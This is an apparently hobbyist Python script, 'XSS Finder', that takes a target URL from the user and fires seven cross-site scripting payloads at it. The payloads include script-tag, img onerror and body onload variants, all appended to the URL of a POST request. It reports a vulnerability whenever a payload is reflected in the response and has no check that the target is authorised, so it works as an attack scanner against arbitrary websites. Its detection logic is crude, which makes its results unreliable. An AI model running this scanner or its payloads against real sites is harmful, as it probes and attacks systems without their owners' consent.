#!usr/bin/env python3
import os, requests, time
from colorama import Fore

bnnr = """
   _  __              _______           __
  | |/ /__________   / ____(_)___  ____/ /
  |   // ___/ ___/  / /_  / / __ \/ __  / 
 /   |(__  |__  )  / __/ / / / / / /_/ /  
/_/|_/____/____/  /_/   /_/_/ /_/\__,_/
"""
payload1 = "<script>alert(:D)</script>"
payload2 = """<ScRipT>alert("XSS");</ScRipT>"""
payload3 = """<img src=xss onerror=alert(1)>"""
payload4 = """<script ~~~>alert(0%0)</script ~~~>"""
payload5 = """<body/onload=&lt;!--&gt;&#10alert(1)>>"""
payload6 = """<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?"""
payload7 = """</script><script>alert(1)</script>"""

def cls():
  if os.name == "nt":
    os.system("cls")
  else:
    os.system("clear")

def banner():
  cls()
  print(f"{Fore.CYAN}{bnnr}{Fore.RESET}")
  print(f"{Fore.RED}Web URL XSS test Script\n")
  print(f"{Fore.RESET}Coded By {Fore.RED}FuekiHigh\n\n{Fore.MAGENTA}Instagram : {Fore.CYAN}@fuekihigh\n")
  print(f"{Fore.GREEN} Version {Fore.RED}0.4{Fore.RESET}\n")



def req_post(url , pyld):
  req = requests.post(url + pyld)
  if pyld in req.text:
    print(f"{Fore.GREEN}\nXSS Vulnerability Founded!")
    print(f"{Fore.RED}\nPayload {Fore.MAGENTA}>>>{Fore.RESET} {pyld}\n\n")
  if not pyld in req.text:
    print(f"{Fore.RED}\n\nPayloads Unsuccessful!\n")

banner()
url = input(f"{Fore.BLUE}[ {Fore.RED}Target {Fore.BLUE}] {Fore.MAGENTA}>>> {Fore.RESET}")
req_post(url, payload1)
req_post(url, payload2)
req_post(url, payload3)
req_post(url, payload4)
req_post(url, payload5)
req_post(url, payload6)
req_post(url, payload7)
